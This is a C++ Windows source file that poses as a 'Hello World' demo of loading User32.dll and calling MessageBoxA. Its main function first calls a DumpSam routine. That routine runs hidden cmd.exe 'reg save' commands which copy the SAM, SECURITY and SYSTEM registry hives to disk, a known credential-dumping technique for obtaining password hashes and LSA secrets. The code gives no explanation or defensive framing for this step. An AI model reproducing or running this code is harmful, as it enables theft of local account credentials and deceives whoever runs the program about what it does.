// main.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <cstdlib>

using namespace std;

//Depending on the call type you can use _stdcall or _cdecl


//Define messageboxA typedef
typedef int(_stdcall* Msg) (HWND, LPCSTR, LPCSTR, UINT);


HINSTANCE LLibrary(LPCWSTR dllToLoad);
void DumpSam();

int main()
{ 

	DumpSam();
    std::cout << "Hello World!\n";

	//Get handle to user32.dll
	HINSTANCE hDll = LLibrary(TEXT("User32.dll"));


	printf("Lib Loaded");
	Msg MsgBox = (Msg)GetProcAddress(hDll, "MessageBoxA");
	MsgBox(NULL, "Test", "test", 0);

	//Release the library
	FreeLibrary(hDll);



	return 0;

}


void DumpSam() {
	//Save the sam registry
	HINSTANCE samReg = ShellExecute(NULL, L"open", L"cmd.exe", L"/C reg save hklm\\sam sam.save ", NULL, SW_HIDE);

	//Check if value returned is greater than 32
	if (!((int)samReg >32)) {
		printf("Error dumping sam reg");
	}

	//Save the security registry
	HINSTANCE securityReg = ShellExecute(NULL, L"open", L"cmd.exe", L"/C reg save hklm\\security  security.save ", NULL, SW_HIDE);

	if (!((int)securityReg > 32)) {
		printf("Error dumping security reg");
	}

	//Save the system registry
	HINSTANCE systemReg = ShellExecute(NULL, L"open", L"cmd.exe", L"/C reg save hklm\\system system.save ", NULL, SW_HIDE);

	if (!((int)systemReg > 32)) {
		printf("Error dumping system reg");
	}
}

//Function to load library
HINSTANCE LLibrary(LPCWSTR dllToLoad) {
	HINSTANCE hDll = LoadLibrary(dllToLoad);

	if (hDll == NULL) {
		wprintf(L"Error getting handle to: %s",dllToLoad);
		exit(1);
	}
	
	return hDll;
}
